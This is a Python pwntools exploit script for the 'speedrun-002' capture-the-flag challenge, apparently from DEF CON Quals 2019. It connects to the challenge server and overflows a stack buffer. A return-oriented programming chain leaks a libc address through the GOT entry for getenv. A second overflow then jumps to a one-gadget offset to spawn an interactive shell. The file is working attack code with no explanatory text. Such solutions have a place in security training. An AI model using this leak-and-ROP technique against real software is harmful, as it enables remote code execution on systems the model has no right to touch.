import sys
from pwn import *

target = ELF('./speedrun-002')

POP_RDI = 0x4008a3
POP_RSI_POP_R15 = 0x4008a1
POP_RDX = 0x4006ec

# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('../libc6_2.27-3ubuntu1_amd64.so')

OFFSET_ONE_GADGET_RCE = int(sys.argv[1])

# r = process('./speedrun-002', env={'DEBUG': ''})
r = remote('speedrun-002.quals2019.oooverflow.io', 31337)

r.sendlineafter('What say you now?\n', 'Everything intelligent is so boring.')

payload = ''
payload += 'A' * 0x408
payload += p64(POP_RDI)
payload += p64(1)
payload += p64(POP_RSI_POP_R15)
payload += p64(target.got['getenv'])
payload += p64(0)
payload += p64(POP_RDX)
payload += p64(0x8)
payload += p64(target.plt['write'])
payload += p64(0x40074c)
r.sendlineafter('Tell me more.\n', payload)

r.recvuntil('Fascinating.\n')
LIBC_BASE = u64(r.read(8)) - libc.symbols['getenv']
log.info(hex(LIBC_BASE))

r.sendlineafter('What say you now?\n', 'Everything intelligent is so boring.')

payload = ''
payload += 'A' * 0x408
payload += p64(LIBC_BASE + OFFSET_ONE_GADGET_RCE)
r.sendlineafter('Tell me more.\n', payload)

r.interactive()
